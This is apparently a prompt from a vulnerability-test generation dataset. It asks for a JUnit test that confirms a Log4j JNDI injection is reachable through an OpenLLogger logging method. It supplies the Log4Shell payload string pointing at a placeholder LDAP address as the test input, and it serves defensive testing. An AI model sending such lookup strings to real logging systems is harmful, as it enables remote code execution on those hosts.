I want you to generate a unit test, using the JUnit testing framework, 
This test is used to verify that the vulnerability was successfully triggered,
You can't have non-existent method calls in the results you give,
Just generate a single test method,
For fuzzy parameters, give specific commonly used types, such as Object,String and so on,
Only the function under test statement is wrapped by a try catch statement(Excluding assert statement), the Exception class uses an exception, and does nothing after the catch,
The code corresponds to the function being tested, with context information, for example: 

The source code of the function under test is (The unit test should test this function):
protected final void log ( String text , Object arg1 ) { logSimpleObject ( text , arg1 ) ; logComplexObject ( arg1 ) ; } 

and the class name of the function under test is:
OpenLLogger

There is a method call chain from the function under test to the function called by the vulnerability code, the list of functions is:
log
logSimpleObject
Where there is a vulnerability code call function source code is (This function is used to help you understand):
private void logSimpleObject ( String text , Object arg1 ) { logger . info ( text , toString ( arg1 ) ) ; } 

and the class name of this function is:
OpenLLogger

The vulnerable third-party library function and the class to which the function belongs are:
class name:Logger
method name:info

The input variable name for this unit test is "input", and the value of this "input" is:
${jndi:ldap://0.0.0.0:1389/Log4jRCE}

After declaring test input data, you need to call the following statement:
MethodCallInterceptor.interceptor(
org.apache.logging.log4j.Logger.class,"info", new Object[]{input}
);

The assert statement to verify that the vulnerability was successfully triggered is fixed as:
assertTrue(MethodCallInterceptor.isTrigger);
